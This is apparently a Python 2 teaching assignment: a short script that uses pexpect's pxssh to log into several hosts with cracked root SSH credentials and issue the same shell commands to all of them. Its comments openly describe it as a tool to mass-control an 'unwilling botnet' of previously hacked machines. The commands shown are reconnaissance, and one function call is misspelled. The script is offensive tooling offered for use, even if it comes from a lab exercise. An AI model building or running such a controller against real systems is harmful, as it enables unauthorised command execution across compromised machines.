import optparse
from pexpect import pxssh

# this is not how to recruit a botnet
# this is actually how to MASS CONTROL a botnet

# You need to crack the SSH logins from the previous assignments
# Just so you can recruit a unwilling botnet
# With their IP addresses both public and private in hand
# You enter the entire IP or subnet range into this program
# then you can issue commands to them with this
class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()
    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e: # error handling
            print e
            print '[-] Error Connecting'
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output + '\n'

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

botNet = []
addClient('10.10.10.110', 'root', 'toor') #login to client that has previously been hacked
addClient('10.10.10.120', 'root', 'toor')
addClient('10.10.10.130', 'root', 'toor')
botnetCommand('uname -v')
botnetCOmmand('cat /etc/issue')
